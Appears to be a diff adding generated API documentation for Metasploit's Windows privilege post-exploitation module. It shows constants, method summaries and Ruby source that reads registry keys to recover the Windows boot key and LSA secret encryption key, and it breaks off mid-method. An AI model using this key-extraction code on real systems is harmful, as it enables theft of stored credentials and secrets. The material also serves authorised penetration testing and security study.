@@ -1,0 +1,1785 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>
+  Module: Msf::Post::Windows::Priv
+  
+    &mdash; Documentation by YARD 0.8.7.4
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" charset="utf-8" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" charset="utf-8" />
+
+<script type="text/javascript" charset="utf-8">
+  hasFrames = window.top.frames.main ? true : false;
+  relpath = '../../../';
+  framesUrl = "../../../frames.html#!Msf/Post/Windows/Priv.html";
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div id="header">
+      <div id="menu">
+  
+    <a href="../../../_index.html">Index (P)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Post.html" title="Msf::Post (class)">Post</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Post::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">Priv</span>
+  
+
+  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
+</div>
+
+      <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+      Class List
+    </a>
+  
+    <a class="full_list_link" id="method_list_link"
+        href="../../../method_list.html">
+      Method List
+    </a>
+  
+    <a class="full_list_link" id="file_list_link"
+        href="../../../file_list.html">
+      File List
+    </a>
+  
+</div>
+      <div class="clear"></div>
+    </div>
+
+    <iframe id="search_frame"></iframe>
+
+    <div id="content"><h1>Module: Msf::Post::Windows::Priv
+  
+  
+  
+</h1>
+
+<dl class="box">
+  
+  
+    
+  
+    
+      <dt class="r1">Includes:</dt>
+      <dd class="r1"><span class='object_link'><a href="Accounts.html" title="Msf::Post::Windows::Accounts (module)">Accounts</a></span>, <span class='object_link'><a href="Registry.html" title="Msf::Post::Windows::Registry (module)">Registry</a></span></dd>
+      
+    
+  
+  
+    <dt class="r2">Included in:</dt>
+    <dd class="r2"><span class='object_link'><a href="../../Scripts/Meterpreter/Common.html" title="Msf::Scripts::Meterpreter::Common (module)">Scripts::Meterpreter::Common</a></span></dd>
+    
+  
+  
+    <dt class="r1 last">Defined in:</dt>
+    <dd class="r1 last">lib/msf/core/post/windows/priv.rb</dd>
+  
+</dl>
+<div class="clear"></div>
+
+
+  <h2>Constant Summary</h2>
+  
+    <dl class="constants">
+      
+        <dt id="INTEGRITY_LEVEL_SID-constant" class="">INTEGRITY_LEVEL_SID =
+          
+        </dt>
+        <dd><pre class="code"><span class='lbrace'>{</span>
+    <span class='symbol'>:low</span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>S-1-16-4096</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='symbol'>:medium</span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>S-1-16-8192</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='symbol'>:high</span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>S-1-16-12288</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='symbol'>:system</span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>S-1-16-16384</span><span class='tstring_end'>&#39;</span></span>
+<span class='rbrace'>}</span></pre></dd>
+      
+        <dt id="SYSTEM_SID-constant" class="">SYSTEM_SID =
+          
+        </dt>
+        <dd><pre class="code"><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>S-1-5-18</span><span class='tstring_end'>&#39;</span></span></pre></dd>
+      
+        <dt id="ADMINISTRATORS_SID-constant" class="">ADMINISTRATORS_SID =
+          
+        </dt>
+        <dd><pre class="code"><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>S-1-5-32-544</span><span class='tstring_end'>&#39;</span></span></pre></dd>
+      
+        <dt id="UAC_NO_PROMPT-constant" class="">UAC_NO_PROMPT =
+          <div class="docstring">
+  <div class="discussion">
+    
+<p><a
+href="http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx">technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx</a>
+ConsentPromptBehaviorAdmin</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+        </dt>
+        <dd><pre class="code"><span class='int'>0</span></pre></dd>
+      
+        <dt id="UAC_PROMPT_CREDS_IF_SECURE_DESKTOP-constant" class="">UAC_PROMPT_CREDS_IF_SECURE_DESKTOP =
+          
+        </dt>
+        <dd><pre class="code"><span class='int'>1</span></pre></dd>
+      
+        <dt id="UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP-constant" class="">UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP =
+          
+        </dt>
+        <dd><pre class="code"><span class='int'>2</span></pre></dd>
+      
+        <dt id="UAC_PROMPT_CREDS-constant" class="">UAC_PROMPT_CREDS =
+          
+        </dt>
+        <dd><pre class="code"><span class='int'>3</span></pre></dd>
+      
+        <dt id="UAC_PROMPT_CONSENT-constant" class="">UAC_PROMPT_CONSENT =
+          
+        </dt>
+        <dd><pre class="code"><span class='int'>4</span></pre></dd>
+      
+        <dt id="UAC_DEFAULT-constant" class="">UAC_DEFAULT =
+          
+        </dt>
+        <dd><pre class="code"><span class='int'>5</span></pre></dd>
+      
+    </dl>
+  
+
+
+
+  
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="Accounts.html" title="Msf::Post::Windows::Accounts (module)">Accounts</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="Accounts.html#DOMAIN_CONTROLLER_INFO-constant" title="Msf::Post::Windows::Accounts::DOMAIN_CONTROLLER_INFO (constant)">Accounts::DOMAIN_CONTROLLER_INFO</a></span>, <span class='object_link'><a href="Accounts.html#GUID-constant" title="Msf::Post::Windows::Accounts::GUID (constant)">Accounts::GUID</a></span></p>
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#capture_boot_key-instance_method" title="#capture_boot_key (instance method)">- (Object) <strong>capture_boot_key</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the unscrambled bootkey.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#capture_lsa_key-instance_method" title="#capture_lsa_key (instance method)">- (Object) <strong>capture_lsa_key</strong>(bootkey) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the LSA key upon input of the unscrambled bootkey.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#convert_des_56_to_64-instance_method" title="#convert_des_56_to_64 (instance method)">- (Object) <strong>convert_des_56_to_64</strong>(kstr) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Converts DES 56 to DES 64.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#decrypt_lsa_data-instance_method" title="#decrypt_lsa_data (instance method)">- (String) <strong>decrypt_lsa_data</strong>(policy_secret, lsa_key) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Decrypts LSA encrypted data.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#decrypt_secret_data-instance_method" title="#decrypt_secret_data (instance method)">- (String) <strong>decrypt_secret_data</strong>(secret, key) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Decrypts “Secret” encrypted data.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_integrity_level-instance_method" title="#get_integrity_level (instance method)">- (Object) <strong>get_integrity_level</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the Integrity Level.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_uac_level-instance_method" title="#get_uac_level (instance method)">- (Object) <strong>get_uac_level</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the UAC Level.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_whoami-instance_method" title="#get_whoami (instance method)">- (Object) <strong>get_whoami</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the output of whoami /groups.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_admin%3F-instance_method" title="#is_admin? (instance method)">- (Boolean) <strong>is_admin?</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns true if user is admin and false if not.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_in_admin_group%3F-instance_method" title="#is_in_admin_group? (instance method)">- (Boolean) <strong>is_in_admin_group?</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns true if in the administrator group.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_system%3F-instance_method" title="#is_system? (instance method)">- (Boolean) <strong>is_system?</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns true if running as Local System.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_uac_enabled%3F-instance_method" title="#is_uac_enabled? (instance method)">- (Boolean) <strong>is_uac_enabled?</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns true if UAC is enabled.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#lsa_vista_style%3F-instance_method" title="#lsa_vista_style? (instance method)">- (Boolean) <strong>lsa_vista_style?</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Whether this system has Vista-style secret keys.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#session_has_ext-instance_method" title="#session_has_ext (instance method)">- (Object) <strong>session_has_ext</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Return true if the session has extended capabilities (ie meterpreter).</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="Registry.html" title="Msf::Post::Windows::Registry (module)">Registry</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="Registry.html#meterpreter_registry_createkey-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_createkey (method)">#meterpreter_registry_createkey</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_deletekey-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_deletekey (method)">#meterpreter_registry_deletekey</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_deleteval-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_deleteval (method)">#meterpreter_registry_deleteval</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_enumkeys-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_enumkeys (method)">#meterpreter_registry_enumkeys</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_enumvals-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_enumvals (method)">#meterpreter_registry_enumvals</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_getvaldata-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_getvaldata (method)">#meterpreter_registry_getvaldata</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_getvalinfo-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_getvalinfo (method)">#meterpreter_registry_getvalinfo</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_loadkey-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_loadkey (method)">#meterpreter_registry_loadkey</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_setvaldata-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_setvaldata (method)">#meterpreter_registry_setvaldata</a></span>, <span class='object_link'><a href="Registry.html#meterpreter_registry_unloadkey-instance_method" title="Msf::Post::Windows::Registry#meterpreter_registry_unloadkey (method)">#meterpreter_registry_unloadkey</a></span>, <span class='object_link'><a href="Registry.html#normalize_key-instance_method" title="Msf::Post::Windows::Registry#normalize_key (method)">#normalize_key</a></span>, <span class='object_link'><a href="Registry.html#registry_createkey-instance_method" title="Msf::Post::Windows::Registry#registry_createkey (method)">#registry_createkey</a></span>, <span class='object_link'><a href="Registry.html#registry_deletekey-instance_method" title="Msf::Post::Windows::Registry#registry_deletekey (method)">#registry_deletekey</a></span>, <span class='object_link'><a href="Registry.html#registry_deleteval-instance_method" title="Msf::Post::Windows::Registry#registry_deleteval (method)">#registry_deleteval</a></span>, <span class='object_link'><a href="Registry.html#registry_enumkeys-instance_method" title="Msf::Post::Windows::Registry#registry_enumkeys (method)">#registry_enumkeys</a></span>, <span class='object_link'><a href="Registry.html#registry_enumvals-instance_method" title="Msf::Post::Windows::Registry#registry_enumvals (method)">#registry_enumvals</a></span>, <span class='object_link'><a href="Registry.html#registry_getvaldata-instance_method" title="Msf::Post::Windows::Registry#registry_getvaldata (method)">#registry_getvaldata</a></span>, <span class='object_link'><a href="Registry.html#registry_getvalinfo-instance_method" title="Msf::Post::Windows::Registry#registry_getvalinfo (method)">#registry_getvalinfo</a></span>, <span class='object_link'><a href="Registry.html#registry_loadkey-instance_method" title="Msf::Post::Windows::Registry#registry_loadkey (method)">#registry_loadkey</a></span>, <span class='object_link'><a href="Registry.html#registry_setvaldata-instance_method" title="Msf::Post::Windows::Registry#registry_setvaldata (method)">#registry_setvaldata</a></span>, <span class='object_link'><a href="Registry.html#registry_unloadkey-instance_method" title="Msf::Post::Windows::Registry#registry_unloadkey (method)">#registry_unloadkey</a></span>, <span class='object_link'><a href="Registry.html#session_has_registry_ext-instance_method" title="Msf::Post::Windows::Registry#session_has_registry_ext (method)">#session_has_registry_ext</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_createkey-instance_method" title="Msf::Post::Windows::Registry#shell_registry_createkey (method)">#shell_registry_createkey</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_deletekey-instance_method" title="Msf::Post::Windows::Registry#shell_registry_deletekey (method)">#shell_registry_deletekey</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_deleteval-instance_method" title="Msf::Post::Windows::Registry#shell_registry_deleteval (method)">#shell_registry_deleteval</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_enumkeys-instance_method" title="Msf::Post::Windows::Registry#shell_registry_enumkeys (method)">#shell_registry_enumkeys</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_enumvals-instance_method" title="Msf::Post::Windows::Registry#shell_registry_enumvals (method)">#shell_registry_enumvals</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_getvaldata-instance_method" title="Msf::Post::Windows::Registry#shell_registry_getvaldata (method)">#shell_registry_getvaldata</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_getvalinfo-instance_method" title="Msf::Post::Windows::Registry#shell_registry_getvalinfo (method)">#shell_registry_getvalinfo</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_loadkey-instance_method" title="Msf::Post::Windows::Registry#shell_registry_loadkey (method)">#shell_registry_loadkey</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_setvaldata-instance_method" title="Msf::Post::Windows::Registry#shell_registry_setvaldata (method)">#shell_registry_setvaldata</a></span>, <span class='object_link'><a href="Registry.html#shell_registry_unloadkey-instance_method" title="Msf::Post::Windows::Registry#shell_registry_unloadkey (method)">#shell_registry_unloadkey</a></span>, <span class='object_link'><a href="Registry.html#split_key-instance_method" title="Msf::Post::Windows::Registry#split_key (method)">#split_key</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="CliParse.html" title="Msf::Post::Windows::CliParse (module)">CliParse</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="CliParse.html#win_parse_error-instance_method" title="Msf::Post::Windows::CliParse#win_parse_error (method)">#win_parse_error</a></span>, <span class='object_link'><a href="CliParse.html#win_parse_results-instance_method" title="Msf::Post::Windows::CliParse#win_parse_results (method)">#win_parse_results</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="Accounts.html" title="Msf::Post::Windows::Accounts (module)">Accounts</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="Accounts.html#delete_user-instance_method" title="Msf::Post::Windows::Accounts#delete_user (method)">#delete_user</a></span>, <span class='object_link'><a href="Accounts.html#get_domain-instance_method" title="Msf::Post::Windows::Accounts#get_domain (method)">#get_domain</a></span>, <span class='object_link'><a href="Accounts.html#resolve_sid-instance_method" title="Msf::Post::Windows::Accounts#resolve_sid (method)">#resolve_sid</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="capture_boot_key-instance_method">
+  
+    - (<tt>Object</tt>) <strong>capture_boot_key</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the unscrambled bootkey</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 181</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_capture_boot_key'>capture_boot_key</span>
+  <span class='id identifier rubyid_bootkey'>bootkey</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_basekey'>basekey</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>System\\CurrentControlSet\\Control\\Lsa</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='words_beg'>%W{</span><span class='tstring_content'>JD</span><span class='words_sep'> </span><span class='tstring_content'>Skew1</span><span class='words_sep'> </span><span class='tstring_content'>GBG</span><span class='words_sep'> </span><span class='tstring_content'>Data</span><span class='words_sep'>}</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_k'>k</span><span class='op'>|</span>
+    <span class='kw'>begin</span>
+      <span class='id identifier rubyid_ok'>ok</span> <span class='op'>=</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_registry'>registry</span><span class='period'>.</span><span class='id identifier rubyid_open_key'>open_key</span><span class='lparen'>(</span><span class='const'>HKEY_LOCAL_MACHINE</span><span class='comma'>,</span> <span class='id identifier rubyid_basekey'>basekey</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_k'>k</span><span class='comma'>,</span> <span class='const'>KEY_READ</span><span class='rparen'>)</span>
+    <span class='kw'>rescue</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Post</span><span class='op'>::</span><span class='const'>Meterpreter</span><span class='op'>::</span><span class='const'>RequestError</span>
+    <span class='kw'>end</span>
+
+    <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='kw'>not</span> <span class='id identifier rubyid_ok'>ok</span>
+    <span class='id identifier rubyid_bootkey'>bootkey</span> <span class='op'>&lt;&lt;</span> <span class='lbracket'>[</span><span class='id identifier rubyid_ok'>ok</span><span class='period'>.</span><span class='id identifier rubyid_query_class'>query_class</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='lparen'>(</span><span class='int'>16</span><span class='rparen'>)</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_ok'>ok</span><span class='period'>.</span><span class='id identifier rubyid_close'>close</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_keybytes'>keybytes</span> <span class='op'>=</span> <span class='id identifier rubyid_bootkey'>bootkey</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_descrambled'>descrambled</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_descrambler'>descrambler</span> <span class='op'>=</span> <span class='lbracket'>[</span> <span class='int'>0x0b</span><span class='comma'>,</span> <span class='int'>0x06</span><span class='comma'>,</span> <span class='int'>0x07</span><span class='comma'>,</span> <span class='int'>0x01</span><span class='comma'>,</span> <span class='int'>0x08</span><span class='comma'>,</span> <span class='int'>0x0a</span><span class='comma'>,</span> <span class='int'>0x0e</span><span class='comma'>,</span> <span class='int'>0x00</span><span class='comma'>,</span> <span class='int'>0x03</span><span class='comma'>,</span> <span class='int'>0x05</span><span class='comma'>,</span> <span class='int'>0x02</span><span class='comma'>,</span> <span class='int'>0x0f</span><span class='comma'>,</span> <span class='int'>0x0d</span><span class='comma'>,</span> <span class='int'>0x09</span><span class='comma'>,</span> <span class='int'>0x0c</span><span class='comma'>,</span> <span class='int'>0x04</span> <span class='rbracket'>]</span>
+
+  <span class='int'>0</span><span class='period'>.</span><span class='id identifier rubyid_upto'>upto</span><span class='lparen'>(</span><span class='id identifier rubyid_keybytes'>keybytes</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='op'>-</span><span class='int'>1</span><span class='rparen'>)</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_x'>x</span><span class='op'>|</span>
+    <span class='id identifier rubyid_descrambled'>descrambled</span> <span class='op'>&lt;&lt;</span> <span class='lbracket'>[</span><span class='id identifier rubyid_keybytes'>keybytes</span><span class='lbracket'>[</span><span class='id identifier rubyid_descrambler'>descrambler</span><span class='lbracket'>[</span><span class='id identifier rubyid_x'>x</span><span class='rbracket'>]</span><span class='rbracket'>]</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_descrambled'>descrambled</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="capture_lsa_key-instance_method">
+  
+    - (<tt>Object</tt>) <strong>capture_lsa_key</strong>(bootkey) 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+  <div class="note notetag">
+    <strong>Note:</strong>
+    <div class='inline'>
+<p>This requires the session be running as SYSTEM</p>
+</div>
+  </div>
+
+
+<p>Returns the LSA key upon input of the unscrambled bootkey</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/priv.rb', line 254</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_capture_lsa_key'>capture_lsa_key</span><span class='lparen'>(</span><span class='id identifier rubyid_bootkey'>bootkey</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Getting PolSecretEncryptionKey...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_pol'>pol</span> <span class='op'>=</span> <span class='id identifier rubyid_registry_getvaldata'>registry_getvaldata</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HKLM\\SECURITY\\Policy\\PolSecretEncryptionKey</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_pol'>pol</span>
+    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>XP or below system</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='ivar'>@lsa_vista_style</span> <span class='op'>=</span> <span class='kw'>false</span>
+    <span class='id identifier rubyid_md5x'>md5x</span> <span class='op'>=</span> <span class='const'>Digest</span><span class='op'>::</span><span class='const'>MD5</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_md5x'>md5x</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_bootkey'>bootkey</span>
+    <span class='lparen'>(</span><span class='int'>1</span><span class='op'>..</span><span class='int'>1000</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span>
+      <span class='id identifier rubyid_md5x'>md5x</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_pol'>pol</span><span class='lbracket'>[</span><span class='int'>60</span><span class='comma'>,</span><span class='int'>16</span><span class='rbracket'>]</span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_rc4'>rc4</span> <span class='op'>=</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>Cipher</span><span class='op'>::</span><span class='const'>Cipher</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>rc4</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_rc4'>rc4</span><span class='period'>.</span><span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_md5x'>md5x</span><span class='period'>.</span><span class='id identifier rubyid_digest'>digest</span>
+    <span class='id identifier rubyid_lsa_key'>lsa_key</span>  <span class='op'>=</span> <span class='id identifier rubyid_rc4'>rc4</span><span class='period'>.</span><span class='id identifier rubyid_update'>update</span><span class='lparen'>(</span><span class='id identifier rubyid_pol'>pol</span><span class='lbracket'>[</span><span class='int'>12</span><span class='comma'>,</span><span class='int'>48</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_lsa_key'>lsa_key</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_rc4'>rc4</span><span class='period'>.</span><span class='id identifier rubyid_final'>final</span>
+    <span class='id identifier rubyid_lsa_key'>lsa_key</span> <span class='op'>=</span> <span class='id identifier rubyid_lsa_key'>lsa_key</span><span class='lbracket'>[</span><span class='int'>0x10</span><span class='op'>..</span><span class='int'>0x1F</span><span class='rbracket'>]</span>
+  <span class='kw'>else</span>
